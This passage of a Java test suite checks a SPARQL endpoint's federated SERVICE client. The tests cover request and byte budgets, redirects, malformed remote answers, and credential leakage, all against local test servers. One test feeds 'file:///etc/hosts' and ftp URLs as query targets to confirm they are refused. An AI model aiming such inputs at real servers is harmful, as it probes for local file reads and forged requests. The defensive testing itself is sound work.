            var r = getCsv(fed.url(), "SELECT * WHERE { " + values(300) + " SERVICE <" + service + "> { ?v <urn:ex:q> ?x } }");
            double took = (System.nanoTime() - t0) / 1e9;
            assertEquals(504, r.statusCode(), r.body());
            assertTrue(took < 2.6, "took " + took + " s under a 2 s limit");
            assertTrue(hits.get() <= 2, "requests made: " + hits.get());
        } finally {
            remote.stop(0);
        }
    }

    /** One query's SERVICE requests are counted; a query that needs more is refused, not run to the end. */
    @Test
    void serviceRequestsPerQueryAreCapped() throws Exception {
        var hits = new java.util.concurrent.atomic.AtomicInteger();
        var remote = serve(java.util.Map.of("/rows", rowEcho(0, hits)));
        try (Endpoint fed = Endpoint.start(EndpointOptions.defaults().withFederationEnabled(true).withUpdateEnabled(true)
                .withMaxServiceRequests(3), 0)) {
            String service = "http://127.0.0.1:" + remote.getAddress().getPort() + "/rows";
            var ok = getCsv(fed.url(), "SELECT * WHERE { " + values(45) + " SERVICE <" + service + "> { ?v <urn:ex:q> ?x } }");
            assertEquals(200, ok.statusCode(), ok.body());   // 45 rows: 3 batches of 15
            assertEquals(45, ok.body().lines().count() - 1);
            hits.set(0);
            var r = getCsv(fed.url(), "SELECT * WHERE { " + values(300) + " SERVICE <" + service + "> { ?v <urn:ex:q> ?x } }");
            assertEquals(503, r.statusCode(), r.body());
            assertTrue(r.body().contains("more than 3 SERVICE requests"), r.body());
            assertEquals(3, hits.get());
            // SILENT does not turn the refusal into a shorter answer
            hits.set(0);
            var silent = getCsv(fed.url(), "SELECT * WHERE { " + values(300) + " SERVICE SILENT <" + service + "> { ?v <urn:ex:q> ?x } }");
            assertEquals(503, silent.statusCode(), silent.body());
            // nor into a partial update: rolled back
            var update = post(fed.url(), "application/sparql-update", "INSERT { ?v <urn:ex:echoed> ?x } WHERE { " + values(300)
                    + " SERVICE SILENT <" + service + "> { ?v <urn:ex:q> ?x } }", null);
            assertEquals(503, update.statusCode(), update.body());
            assertFalse(ask(fed.url(), "ASK { ?v <urn:ex:echoed> ?x }"), "a partial update committed");
        } finally {
            remote.stop(0);
        }
    }

    /** A SERVICE answer is read whole within a byte cap: an endless one is refused at the cap, at once. */
    @Test
    void serviceAnswersAreCappedInBytes() throws Exception {
        var remote = serve(java.util.Map.of("/endless", ex -> {
            ex.getResponseHeaders().add("Content-Type", "application/sparql-results+json");
            ex.sendResponseHeaders(200, 0);
            try (var out = ex.getResponseBody()) {
                out.write("{\"head\":{\"vars\":[\"x\"]},\"results\":{\"bindings\":[".getBytes(StandardCharsets.UTF_8));
                byte[] row = ("{\"x\":{\"type\":\"literal\",\"value\":\"" + "y".repeat(1000) + "\"}},").repeat(64)
                        .getBytes(StandardCharsets.UTF_8);
                for (int i = 0; i < 100_000; i++) {
                    out.write(row);
                }
            } catch (IOException gone) {
                // the endpoint stopped reading
            }
        }));
        try (Endpoint fed = Endpoint.start(EndpointOptions.defaults().withFederationEnabled(true)
                .withMaxServiceBytes(1L << 20), 0)) {
            long t0 = System.nanoTime();
            var r = getCsv(fed.url(), "SELECT * WHERE { SERVICE <http://127.0.0.1:" + remote.getAddress().getPort()
                    + "/endless> { ?s ?p ?x } }");
            assertEquals(502, r.statusCode(), r.body());
            assertTrue(r.body().contains("more than 1048576 bytes"), r.body());
            assertTrue((System.nanoTime() - t0) / 1e9 < 5, "the cap took too long: the rest of the answer was drained");
        } finally {
            remote.stop(0);
        }
    }

    /**
     * SERVICE SILENT keeps the query's own rows when the remote's answer is broken, as it does when
     * the remote cannot be reached. RDF4J dropped every row when the failure came while it iterated
     * (a complete HTTP body holding broken JSON): 200 with no rows, and an update wrote nothing.
     */
    @Test
    void serviceSilentKeepsTheRowsWhenTheAnswerIsBroken() throws Exception {
        var remote = serve(java.util.Map.of("/broken", respond(200, "application/sparql-results+json",
                "{\"head\":{\"vars\":[\"x\"]},\"results\":{\"bindings\":[{\"x\":{\"type\":\"lit", 0)));
        try (Endpoint fed = Endpoint.start(EndpointOptions.defaults().withFederationEnabled(true).withUpdateEnabled(true), 0)) {
            String service = "http://127.0.0.1:" + remote.getAddress().getPort() + "/broken";
            var r = getCsv(fed.url(), "SELECT ?v WHERE { ?v <urn:ex:depot> ?d SERVICE SILENT <" + service + "> { ?y <urn:ex:q> ?x } } ORDER BY ?v");
            assertEquals(200, r.statusCode(), r.body());
            assertEquals(List.of("v", "urn:ex:EV-3K8", "urn:ex:EV-7Q2"), r.body().lines().toList());
            assertEquals(204, post(fed.url(), "application/sparql-update", "INSERT { ?v <urn:ex:checked> true } WHERE { "
                    + "?v <urn:ex:depot> ?d SERVICE SILENT <" + service + "> { ?y <urn:ex:q> ?x } }", null).statusCode());
            assertEquals(3, getCsv(fed.url(), "SELECT ?v WHERE { ?v <urn:ex:checked> true }").body().lines().count());
            var loud = getCsv(fed.url(), "SELECT ?v WHERE { ?v <urn:ex:depot> ?d SERVICE <" + service + "> { ?y <urn:ex:q> ?x } }");
            assertEquals(502, loud.statusCode(), loud.body());
            assertTrue(loud.body().contains("malformed result"), loud.body());
        } finally {
            remote.stop(0);
        }
    }

    /**
     * A remote that fails is a 502 that says how — its status and the start of its reason — not a
     * 500 "query evaluation failed", and not "answered Content-Type text/plain", which hid the
     * remote's own reason because the format was checked before the status. CSV is refused too:
     * RDF4J re-types what it reads from it.
     */
    @Test
    void aRemoteThatFailsIsA502ThatSaysHow() throws Exception {
        var remote = serve(java.util.Map.of(
                "/forbidden", respond(403, "text/plain; charset=UTF-8", "federation is off over here", 0),
                "/csv", respond(200, "text/csv", "v,s\r\nurn:ex:v1,001\r\n", 0)));
        try (Endpoint fed = Endpoint.start(EndpointOptions.defaults().withFederationEnabled(true), 0)) {
            String base = "http://127.0.0.1:" + remote.getAddress().getPort();
            var forbidden = getCsv(fed.url(), "SELECT * WHERE { SERVICE <" + base + "/forbidden> { ?s ?p ?o } }");
            assertEquals(502, forbidden.statusCode(), forbidden.body());
            assertTrue(forbidden.body().contains("answered HTTP 403: federation is off over here"), forbidden.body());
            var dead = getCsv(fed.url(), "SELECT * WHERE { SERVICE <http://127.0.0.1:1/sparql> { ?s ?p ?o } }");
            assertEquals(502, dead.statusCode(), dead.body());
            assertTrue(dead.body().contains("could not be reached"), dead.body());
            var csv = getCsv(fed.url(), "SELECT * WHERE { SERVICE <" + base + "/csv> { ?v <urn:ex:s> ?s } }");
            assertEquals(502, csv.statusCode(), csv.body());
            assertTrue(csv.body().contains("answered Content-Type 'text/csv'"), csv.body());
            assertFalse(TimedServiceClient.ACCEPT.contains("csv"), TimedServiceClient.ACCEPT);
        } finally {
            remote.stop(0);
        }
    }

    /**
     * Only http and https, whatever names the endpoint: a variable bound at run time skipped the
     * servlet's check of constant IRIs, and a redirect could leave http too. SILENT does not turn
     * the refusal into an empty match.
     */
    @Test
    void variableEndpointsAndRedirectsStayOnHttp() throws Exception {
        var hits = new java.util.concurrent.atomic.AtomicInteger();
        var remote = serve(java.util.Map.of("/to-ftp", respond(302, "text/plain", "", 0, "Location", "ftp://127.0.0.1/x"),
                "/rows", rowEcho(0, hits)));
        try (Endpoint fed = Endpoint.start(EndpointOptions.defaults().withFederationEnabled(true), 0)) {
            for (String target : List.of("file:///etc/hosts", "ftp://127.0.0.1/x")) {
                var r = getCsv(fed.url(), "SELECT * WHERE { VALUES ?e { <" + target + "> } SERVICE ?e { ?s ?p ?o } }");
                assertEquals(403, r.statusCode(), target + ": " + r.body());
                var silent = getCsv(fed.url(), "SELECT * WHERE { VALUES ?e { <" + target + "> } SERVICE SILENT ?e { ?s ?p ?o } }");
                assertEquals(403, silent.statusCode(), target + " under SILENT: " + silent.body());
            }
            String base = "http://127.0.0.1:" + remote.getAddress().getPort();
            var ok = getCsv(fed.url(), "SELECT * WHERE { VALUES ?e { <" + base + "/rows> } SERVICE ?e { ?s ?p ?x } }");
            assertEquals(200, ok.statusCode(), ok.body());   // a variable http endpoint still works
            var redirected = getCsv(fed.url(), "SELECT * WHERE { SERVICE <" + base + "/to-ftp> { ?s ?p ?o } }");
            assertEquals(502, redirected.statusCode(), redirected.body());
            assertTrue(redirected.body().contains("only http and https are followed"), redirected.body());
        } finally {
            remote.stop(0);
        }
    }

    /** A redirect from https may not drop to plain http (the LOAD rule); checked on the rule itself, without a TLS server. */
    @Test
    void anHttpsServiceIsNotRedirectedToHttp() {
        URI from = URI.create("https://remote.example/sparql?query=x");
        String down = TimedServiceClient.refusedRedirect(from, URI.create("http://remote.example/sparql"));
        assertTrue(down != null && down.contains("may not drop to plain http"), String.valueOf(down));
        assertEquals(null, TimedServiceClient.refusedRedirect(from, URI.create("https://mirror.example/sparql")));
        assertEquals(null, TimedServiceClient.refusedRedirect(URI.create("http://a.example/"), URI.create("https://b.example/")));
        assertTrue(TimedServiceClient.refusedRedirect(from, URI.create("ftp://remote.example/x")).contains("only http and https"));
    }

    // ---- co-review of #129 ------------------------------------------------------------------------

    /**
     * deflate answers gave no connection back: the decoder stops at the end of the compressed data,
     * short of the end of the body, so Apache never took the connection back, and with the route's
     * five connections leased the sixth request waited for one. (Java's gzip decoder reads its
     * trailer to the end, which is why gzip did not show it.)
     */
    @Test
    void compressedServiceAnswersGiveTheirConnectionBack() throws Exception {
        var hits = new java.util.concurrent.atomic.AtomicInteger();
        var plain = rowEcho(0, hits);
        var remote = serve(java.util.Map.of("/gz", ex -> {
            // rowEcho's answer, deflated
            var capture = new java.io.ByteArrayOutputStream();
            com.sun.net.httpserver.HttpExchange wrapped = new com.sun.net.httpserver.HttpExchange() {
                final com.sun.net.httpserver.Headers out = new com.sun.net.httpserver.Headers();
                public com.sun.net.httpserver.Headers getRequestHeaders() { return ex.getRequestHeaders(); }
                public com.sun.net.httpserver.Headers getResponseHeaders() { return out; }
                public URI getRequestURI() { return ex.getRequestURI(); }
                public String getRequestMethod() { return ex.getRequestMethod(); }
                public com.sun.net.httpserver.HttpContext getHttpContext() { return ex.getHttpContext(); }
                public void close() { }
                public java.io.InputStream getRequestBody() { return ex.getRequestBody(); }
                public java.io.OutputStream getResponseBody() { return capture; }
                public void sendResponseHeaders(int code, long length) { }
                public java.net.InetSocketAddress getRemoteAddress() { return ex.getRemoteAddress(); }
                public int getResponseCode() { return 200; }
                public java.net.InetSocketAddress getLocalAddress() { return ex.getLocalAddress(); }
                public String getProtocol() { return ex.getProtocol(); }
                public Object getAttribute(String name) { return null; }
                public void setAttribute(String name, Object value) { }
                public void setStreams(java.io.InputStream i, java.io.OutputStream o) { }
                public com.sun.net.httpserver.HttpPrincipal getPrincipal() { return null; }
            };
            plain.handle(wrapped);
            var deflated = new java.io.ByteArrayOutputStream();
            try (var z = new java.util.zip.DeflaterOutputStream(deflated)) {
                z.write(capture.toByteArray());
            }
            ex.getResponseHeaders().add("Content-Type", "application/sparql-results+json");
            ex.getResponseHeaders().add("Content-Encoding", "deflate");
            // the body promises 64 KB more than the compressed data and then stalls: a client that
            // drained it to reuse the connection would wait here (closing the decoder drains)
            ex.sendResponseHeaders(200, deflated.size() + 65_536);
            ex.getResponseBody().write(deflated.toByteArray());
            ex.getResponseBody().flush();
            try {
                Thread.sleep(8_000);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
            ex.close();
        }));
        try (Endpoint fed = Endpoint.start(EndpointOptions.defaults().withFederationEnabled(true).withMaxExecutionSeconds(10), 0)) {
            long t0 = System.nanoTime();
            var r = getCsv(fed.url(), "SELECT * WHERE { " + values(150) + " SERVICE <http://127.0.0.1:"
                    + remote.getAddress().getPort() + "/gz> { ?v <urn:ex:q> ?x } }");
            assertEquals(200, r.statusCode(), r.body());
            assertEquals(150, r.body().lines().count() - 1);
            assertEquals(10, hits.get());
            assertTrue((System.nanoTime() - t0) / 1e9 < 5, "a request waited for a connection, or drained one");
        } finally {
            remote.stop(0);
        }
    }

    /**
     * Redirects are followed by the client itself, each counted against the query's requests, and
     * a redirect's body is dropped, not read: Apache followed one past a budget of a single
     * request, and drained its body with no cap. Off-http redirects are refused under SILENT too.
     */
    @Test
    void redirectsCountAgainstTheBudgetAndAreNotDrained() throws Exception {
        var hits = new java.util.concurrent.atomic.AtomicInteger();
        var refusedHits = new java.util.concurrent.atomic.AtomicInteger();
        var remote = serve(java.util.Map.of(
                "/to-ftp-counted", ex -> {
                    refusedHits.incrementAndGet();
                    respond(302, "text/plain", "", 0, "Location", "ftp://127.0.0.1/x").handle(ex);
                },
                "/hop", ex -> {
                    ex.getResponseHeaders().add("Location", "/rows");
                    ex.sendResponseHeaders(302, 0);
                    try (var out = ex.getResponseBody()) {
                        byte[] junk = new byte[1 << 20];
                        for (int i = 0; i < 4096; i++) {
                            out.write(junk);   // 4 GB of redirect body nobody should read
                        }
                    } catch (IOException gone) {
                        // dropped, as it should be
                    }
                },
                "/rows", rowEcho(0, hits),
                "/to-ftp", respond(302, "text/plain", "", 0, "Location", "ftp://127.0.0.1/x")));
        String base = "http://127.0.0.1:" + remote.getAddress().getPort();
        try (Endpoint fed = Endpoint.start(EndpointOptions.defaults().withFederationEnabled(true), 0);
             Endpoint one = Endpoint.start(EndpointOptions.defaults().withFederationEnabled(true).withMaxServiceRequests(1), 0)) {
            long t0 = System.nanoTime();
            var followed = getCsv(fed.url(), "SELECT * WHERE { SERVICE <" + base + "/hop> { ?s ?p ?x } }");
            assertEquals(200, followed.statusCode(), followed.body());
            assertTrue((System.nanoTime() - t0) / 1e9 < 5, "the redirect's body was read");
            assertEquals(1, hits.get());
            var counted = getCsv(one.url(), "SELECT * WHERE { SERVICE <" + base + "/hop> { ?s ?p ?x } }");
            assertEquals(503, counted.statusCode(), "the redirect is a second request: " + counted.body());
            var silent = getCsv(fed.url(), "SELECT * WHERE { ?v <urn:ex:depot> ?d SERVICE SILENT <" + base + "/to-ftp> { ?s ?p ?o } }");
            assertEquals(502, silent.statusCode(), "a refused redirect under SILENT: " + silent.body());
            // and once refused, the query asks nothing more: 3 batches, 1 request
            var batches = getCsv(fed.url(), "SELECT * WHERE { " + values(45) + " SERVICE SILENT <" + base
                    + "/to-ftp-counted> { ?v <urn:ex:q> ?x } }");
            assertEquals(502, batches.statusCode(), batches.body());
            assertEquals(1, refusedHits.get(), "requests after the refusal");
        } finally {
            remote.stop(0);
        }
    }

    /**
     * Bytes count as they are read, failed and error answers included, and across all of a
     * query's answers; once the budget is spent no further request is made, SILENT or not.
     */
    @Test
    void serviceBytesAreCountedAcrossAnswersAndFailures() throws Exception {
        var hits = new java.util.concurrent.atomic.AtomicInteger();
        var errors = new java.util.concurrent.atomic.AtomicInteger();
        var remote = serve(java.util.Map.of("/rows", rowEcho(0, hits), "/error", ex -> {
            errors.incrementAndGet();
            byte[] body = "x".repeat(1024).getBytes(StandardCharsets.UTF_8);
            ex.getResponseHeaders().add("Content-Type", "text/plain");
            ex.sendResponseHeaders(500, body.length);
            ex.getResponseBody().write(body);
            ex.close();
        }));
        String base = "http://127.0.0.1:" + remote.getAddress().getPort();
        // one batch of 15 rows answers about 1.3 KB: each answer fits in 4 KB, ten of them do not
        try (Endpoint fed = Endpoint.start(EndpointOptions.defaults().withFederationEnabled(true).withMaxServiceBytes(4096), 0)) {
            var many = getCsv(fed.url(), "SELECT * WHERE { " + values(150) + " SERVICE <" + base + "/rows> { ?v <urn:ex:q> ?x } }");
            assertEquals(502, many.statusCode(), many.body());
            assertTrue(hits.get() < 10, "requests went on after the bytes were spent: " + hits.get());
            var silent = getCsv(fed.url(), "SELECT * WHERE { " + values(150) + " SERVICE SILENT <" + base + "/error> { ?v <urn:ex:q> ?x } }");
            assertEquals(502, silent.statusCode(), "error answers spend the budget too: " + silent.body());
            assertTrue(errors.get() < 10, "requests made: " + errors.get());
        } finally {
            remote.stop(0);
        }
    }

    /** A timeout counts as one whichever deadline wins: the name lookup's own one vanished under SILENT. */
    @Test
    void aNameLookupTimeoutTripsTheBudget() {
        try (var budget = TimedServiceClient.Budget.open(30, 100, 1 << 20)) {
            var lookup = new java.net.UnknownHostException("stalled.example: name lookup did not finish within 1000 ms");
            lookup.initCause(new java.net.SocketTimeoutException("name lookup deadline"));
            IOException reported = TimedServiceClient.failure(lookup, new java.util.concurrent.atomic.AtomicBoolean(false), 1000,
                    budget, new org.apache.http.HttpHost("stalled.example", 80), "could not be reached");
            assertTrue(reported instanceof java.net.SocketTimeoutException, reported.toString());
            assertEquals(504, budget.tripped().status);
        }
    }

    /** RDF4J's parser alone accepted answers that are not SPARQL results, and read them as no rows. */
    @Test
    void onlyWellFormedSparqlJsonIsAccepted() throws Exception {
        String json = "application/sparql-results+json";
        for (String bad : List.of("{}", "{\"head\":{\"vars\":[\"x\"]}}", "{\"head\":{},\"results\":{\"bindings\":[]}} trailing",
                "{\"head\":{},\"boolean\":42}", "{\"head\":{},\"results\":{}}", "[]",
                "{\"head\":{},\"results\":{\"bindings\":[]},\"boolean\":true}")) {
            assertTrue(TimedServiceClient.invalidResult(json, bad.getBytes(StandardCharsets.UTF_8), null) != null, bad);
        }
        for (String good : List.of("{\"head\":{\"vars\":[\"x\"]},\"results\":{\"bindings\":[]}}", "{\"head\":{},\"boolean\":true}",
                "{\"head\":{\"vars\":[\"x\"]},\"results\":{\"bindings\":[{\"x\":{\"type\":\"literal\",\"value\":\"a\"}}]}}")) {
            assertEquals(null, TimedServiceClient.invalidResult(json, good.getBytes(StandardCharsets.UTF_8), null), good);
        }
        assertEquals(null, TimedServiceClient.invalidResult("text/boolean", "true".getBytes(StandardCharsets.UTF_8), null));
        assertTrue(TimedServiceClient.invalidResult("text/tab-separated-values", "?x\ntrue\n".getBytes(StandardCharsets.UTF_8), null) != null);
        // end to end: a head-only answer under SILENT keeps the rows
        var remote = serve(java.util.Map.of("/head", respond(200, json, "{\"head\":{\"vars\":[\"x\"]}}", 0),
                "/tsv", respond(200, "text/tab-separated-values", "?x\n\"a\"\n", 0)));
        try (Endpoint fed = Endpoint.start(EndpointOptions.defaults().withFederationEnabled(true), 0)) {
            String base = "http://127.0.0.1:" + remote.getAddress().getPort();
            var r = getCsv(fed.url(), "SELECT ?v WHERE { ?v <urn:ex:depot> ?d SERVICE SILENT <" + base + "/head> { ?y <urn:ex:q> ?x } }");
            assertEquals(3, r.body().lines().count(), r.body());
            var tsv = getCsv(fed.url(), "SELECT * WHERE { SERVICE <" + base + "/tsv> { ?s ?p ?x } }");
            assertEquals(502, tsv.statusCode(), tsv.body());
            assertTrue(tsv.body().contains("answered Content-Type 'text/tab-separated-values'"), tsv.body());
        } finally {
            remote.stop(0);
        }
    }

    /** An answer that breaks off at the HTTP level is the remote's failure: 502, not 500. */
    @Test
    void anAnswerThatBreaksOffIsA502() throws Exception {
        var remote = serve(java.util.Map.of("/short", ex -> {
            ex.getResponseHeaders().add("Content-Type", "application/sparql-results+json");
            ex.sendResponseHeaders(200, 1000);   // promises 1,000 bytes
            ex.getResponseBody().write("{\"head\":{\"vars\":[]}".getBytes(StandardCharsets.UTF_8));
            ex.getResponseBody().flush();
            ex.getHttpContext().getServer().stop(0);   // and closes after 19
        }));
        try (Endpoint fed = Endpoint.start(EndpointOptions.defaults().withFederationEnabled(true), 0)) {
            var r = getCsv(fed.url(), "SELECT * WHERE { SERVICE <http://127.0.0.1:" + remote.getAddress().getPort() + "/short> { ?s ?p ?o } }");
            assertEquals(502, r.statusCode(), r.body());
        }
    }

    /** No credentials leave: a user:pass@ in the URL was sent once the remote asked (Basic, on the second request). */
    @Test
    void noCredentialsAreSentEvenWhenARemoteAsks() throws Exception {
        var seen = new java.util.concurrent.CopyOnWriteArrayList<String>();
        var remote = serve(java.util.Map.of("/auth", ex -> {
            seen.add(String.valueOf(ex.getRequestHeaders().getFirst("Authorization")));
            ex.getResponseHeaders().add("WWW-Authenticate", "Basic realm=\"r\"");
            ex.getResponseHeaders().add("Content-Type", "text/plain");
            ex.sendResponseHeaders(401, -1);
            ex.close();
        }));
        try (Endpoint fed = Endpoint.start(EndpointOptions.defaults().withFederationEnabled(true), 0)) {
            var r = getCsv(fed.url(), "SELECT * WHERE { SERVICE <http://user:secret@127.0.0.1:" + remote.getAddress().getPort()
                    + "/auth> { ?s ?p ?o } }");
            assertEquals(502, r.statusCode(), r.body());
            assertTrue(r.body().contains("answered HTTP 401"), r.body());
            assertEquals(List.of("null"), seen, "Authorization sent: " + seen);
        } finally {
            remote.stop(0);
        }
    }

    // ---- co-review round 2 of #129 ----------------------------------------------------------------

    /** An error answer that spends the budget trips it there and then; it returned with nothing recorded, and SILENT went on. */
    @Test
    void anErrorAnswerThatSpendsTheBudgetTripsIt() throws Exception {
        var remote = serve(java.util.Map.of("/error", respond(500, "text/plain", "x".repeat(1024), 0)));
        try (Endpoint fed = Endpoint.start(EndpointOptions.defaults().withFederationEnabled(true).withUpdateEnabled(true)
                .withMaxServiceBytes(50), 0)) {
            String service = "http://127.0.0.1:" + remote.getAddress().getPort() + "/error";
            var r = getCsv(fed.url(), "SELECT ?v WHERE { ?v <urn:ex:depot> ?d SERVICE SILENT <" + service + "> { ?y <urn:ex:q> ?x } }");
            assertEquals(502, r.statusCode(), r.body());
            var u = post(fed.url(), "application/sparql-update", "INSERT { ?v <urn:ex:spent> true } WHERE { ?v <urn:ex:depot> ?d "
                    + "SERVICE SILENT <" + service + "> { ?y <urn:ex:q> ?x } }", null);
            assertEquals(502, u.statusCode(), u.body());
            assertFalse(ask(fed.url(), "ASK { ?v <urn:ex:spent> true }"), "the update committed");
        } finally {
            remote.stop(0);
        }
    }

    /**
     * The shape is checked in full, and against the form the query asked for: RDF4J took a binding
     * outside head.vars, a number for a term's value, a boolean answering a SELECT and text after
     * 'false', and read each as no rows — under SILENT dropping the query's own.
     */
    @Test
    void answersAreCheckedInFullAndAgainstTheQueryForm() throws Exception {
        String json = "application/sparql-results+json";
        for (String bad : List.of(
                "{\"head\":{},\"results\":{\"bindings\":[{\"x\":{\"type\":\"literal\",\"value\":\"a\"}}]}}",
                "{\"head\":{\"vars\":[\"y\"]},\"results\":{\"bindings\":[{\"x\":{\"type\":\"literal\",\"value\":\"a\"}}]}}",
                "{\"head\":{\"vars\":[\"x\"]},\"results\":{\"bindings\":[{\"x\":{\"type\":\"literal\",\"value\":42}}]}}",
                "{\"head\":{\"vars\":[\"x\"]},\"results\":{\"bindings\":[{\"x\":{\"type\":\"thing\",\"value\":\"a\"}}]}}",
                "{\"head\":{\"vars\":[\"x\"]},\"results\":{\"bindings\":[{\"x\":\"a\"}]}}")) {
            assertTrue(TimedServiceClient.invalidResult(json, bad.getBytes(StandardCharsets.UTF_8), null) != null, bad);
        }
        byte[] bool = "{\"head\":{},\"boolean\":false}".getBytes(StandardCharsets.UTF_8);
        assertTrue(TimedServiceClient.invalidResult(json, bool, true) != null, "a boolean answering a SELECT");
        assertEquals(null, TimedServiceClient.invalidResult(json, bool, false));
        assertTrue(TimedServiceClient.invalidResult("text/boolean", ("false" + " ".repeat(11) + "junk").getBytes(StandardCharsets.UTF_8), null) != null);
        assertEquals(null, TimedServiceClient.invalidResult("text/boolean", " false\n".getBytes(StandardCharsets.UTF_8), false));
        // the form, read from the query text, by URL or form body
        assertEquals(Boolean.TRUE, TimedServiceClient.expectedForm(new org.apache.http.client.methods.HttpGet(
                "http://r.example/sparql?query=" + enc("PREFIX rdf: <http://www.w3.org/1999/02/22-rdf-syntax-ns#>\nSELECT ?x WHERE {}"))));
        var post = new org.apache.http.client.methods.HttpPost("http://r.example/sparql");
        post.setEntity(new org.apache.http.client.entity.UrlEncodedFormEntity(List.of(
                new org.apache.http.message.BasicNameValuePair("query", "BASE <http://b/>\n# note\nASK { ?s ?p ?o }")), StandardCharsets.UTF_8));
        assertEquals(Boolean.FALSE, TimedServiceClient.expectedForm(post));
        assertEquals(null, TimedServiceClient.expectedForm(new org.apache.http.client.methods.HttpGet("http://r.example/sparql")));
        // end to end: a boolean answering the SELECT RDF4J sends is the remote's failure, and SILENT keeps the rows
        var remote = serve(java.util.Map.of("/bool", respond(200, json, "{\"head\":{},\"boolean\":false}", 0)));
        try (Endpoint fed = Endpoint.start(EndpointOptions.defaults().withFederationEnabled(true), 0)) {
            String service = "http://127.0.0.1:" + remote.getAddress().getPort() + "/bool";
            var loud = getCsv(fed.url(), "SELECT ?v WHERE { ?v <urn:ex:depot> ?d SERVICE <" + service + "> { ?y <urn:ex:q> ?x } }");
            assertEquals(502, loud.statusCode(), loud.body());
            var silent = getCsv(fed.url(), "SELECT ?v WHERE { ?v <urn:ex:depot> ?d SERVICE SILENT <" + service + "> { ?y <urn:ex:q> ?x } }");
            assertEquals(3, silent.body().lines().count(), silent.body());
        } finally {
            remote.stop(0);
        }
    }

    /**
     * Redirects resolve as Apache resolved them (a query-only Location keeps the path; URI.resolve
     * dropped it), a Location with no host is the remote's failure (it was an NPE, a 500), and so is
     * a 2xx with no result (a 204 went on to RDF4J, a 500 quoting the outbound query).
     */
    @Test
    void oddRedirectsAndEmptyAnswersAreTheRemotesFailure() throws Exception {
        var hits = new java.util.concurrent.atomic.AtomicInteger();
        var rows = rowEcho(0, hits);
        var remote = serve(java.util.Map.of(
                "/qr", ex -> {
                    if (String.valueOf(ex.getRequestURI().getRawQuery()).contains("redirected")) {
                        rows.handle(ex);
                    } else {
                        respond(302, "text/plain", "", 0, "Location", "?redirected=1").handle(ex);
                    }
                },
                "/nohost", respond(302, "text/plain", "", 0, "Location", "http:/broken"),
                "/empty", ex -> {
                    ex.sendResponseHeaders(204, -1);
                    ex.close();
                }));
        try (Endpoint fed = Endpoint.start(EndpointOptions.defaults().withFederationEnabled(true), 0)) {
            String base = "http://127.0.0.1:" + remote.getAddress().getPort();
            var qr = getCsv(fed.url(), "SELECT * WHERE { SERVICE <" + base + "/qr> { ?s ?p ?x } }");
            assertEquals(200, qr.statusCode(), qr.body());
            assertEquals(1, hits.get());
            var nohost = getCsv(fed.url(), "SELECT * WHERE { SERVICE <" + base + "/nohost> { ?s ?p ?o } }");
            assertEquals(502, nohost.statusCode(), nohost.body());
            assertTrue(nohost.body().contains("names no host"), nohost.body());
            var empty = getCsv(fed.url(), "SELECT * WHERE { SERVICE <" + base + "/empty> { ?s ?p ?o } }");
            assertEquals(502, empty.statusCode(), empty.body());
            assertTrue(empty.body().contains("answered HTTP 204"), empty.body());
            assertFalse(empty.body().contains("query="), "the outbound query leaked into the answer: " + empty.body());
        } finally {
            remote.stop(0);
        }
    }

    /** A query's budget bounds a name lookup even when the client was installed with no deadline of its own. */
    @Test
    void aBudgetBoundsANameLookupWhenTheClientHasNoDeadline() throws Exception {
        var release = new java.util.concurrent.CountDownLatch(1);
        TimedServiceClient client = new TimedServiceClient(0, host -> {
            try {
                release.await();
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
            throw new java.net.UnknownHostException(host);
        });
        try {
            long t0 = System.nanoTime();
            // preemptive, on this thread's budget: an unbounded lookup fails the test instead of hanging it
            var call = java.util.concurrent.CompletableFuture.supplyAsync(() -> {
                var budget = TimedServiceClient.Budget.open(1, 100, 1 << 20);
                try {
                    client.execute(new org.apache.http.client.methods.HttpGet("http://stalled.example/sparql"));
                    return (TimedServiceClient.Refusal) null;
                } catch (IOException expected) {
                    return budget.tripped();
                } finally {
                    budget.close();
                }
            });
            TimedServiceClient.Refusal tripped = call.get(5, java.util.concurrent.TimeUnit.SECONDS);
            double took = (System.nanoTime() - t0) / 1e9;
            assertTrue(took < 2.5, "took " + took + " s under a 1 s budget");
            assertEquals(504, tripped.status);
        } finally {
            release.countDown();
            client.close();
        }
    }

    // ---- co-review round 3 of #129 ----------------------------------------------------------------

    /** The form is read in one pass: a regex recursed per PREFIX, and 2,000 of them overflowed the stack. */
    @Test
    void theQueryFormIsReadWithoutRecursion() {
        String prologue = "PREFIX p0: <urn:p0>\n".repeat(2000);
        assertEquals(Boolean.TRUE, TimedServiceClient.formOf(prologue + "SELECT * WHERE {}"));
        assertEquals(Boolean.FALSE, TimedServiceClient.formOf("BASE <http://b/>\n# a comment\nask { ?s ?p ?o }"));
        assertEquals(null, TimedServiceClient.formOf("CONSTRUCT WHERE {}"));
        assertEquals(null, TimedServiceClient.formOf("SELECTED"));
        assertEquals(null, TimedServiceClient.formOf("PREFIX p: <unclosed"));
    }

    /** RDF-star triple terms are refused: RDF4J read one with a string value as an unbound variable. */
    @Test
    void tripleTermsAreRefused() {
        String triple = "{\"head\":{\"vars\":[\"x\"]},\"results\":{\"bindings\":[{\"x\":{\"type\":\"triple\",\"value\":\"a\"}}]}}";
        assertTrue(TimedServiceClient.invalidResult("application/sparql-results+json", triple.getBytes(StandardCharsets.UTF_8), null) != null);
    }

    /** A boolean answer reaches RDF4J as the answer alone: RDF4J reads 16 characters, and "                false" read as no answer. */
    @Test
    void aBooleanAnswerIsPassedOnCanonical() throws Exception {
        var remote = serve(java.util.Map.of("/bool", respond(200, "text/boolean", " ".repeat(16) + "false\n", 0)));
        TimedServiceClient client = new TimedServiceClient(5000);
        try {
            var r = client.execute(new org.apache.http.client.methods.HttpGet("http://127.0.0.1:" + remote.getAddress().getPort()
                    + "/bool?query=" + enc("ASK { ?s ?p ?o }")));
            byte[] body = org.apache.http.util.EntityUtils.toByteArray(r.getEntity());
            assertEquals("false", new String(body, StandardCharsets.US_ASCII));
            assertFalse(org.eclipse.rdf4j.query.resultio.QueryResultIO.parseBoolean(new java.io.ByteArrayInputStream(body),
                    org.eclipse.rdf4j.query.resultio.BooleanQueryResultFormat.TEXT));
        } finally {
            client.close();
            remote.stop(0);
        }
    }

    /** A redirect to a port out of range is the remote's failure: it came back as the caller's 400. */
    @Test
    void aRedirectToAnImpossiblePortIsA502() throws Exception {
        var remote = serve(java.util.Map.of("/far", respond(302, "text/plain", "", 0, "Location", "http://127.0.0.1:65536/result")));
        try (Endpoint fed = Endpoint.start(EndpointOptions.defaults().withFederationEnabled(true), 0)) {
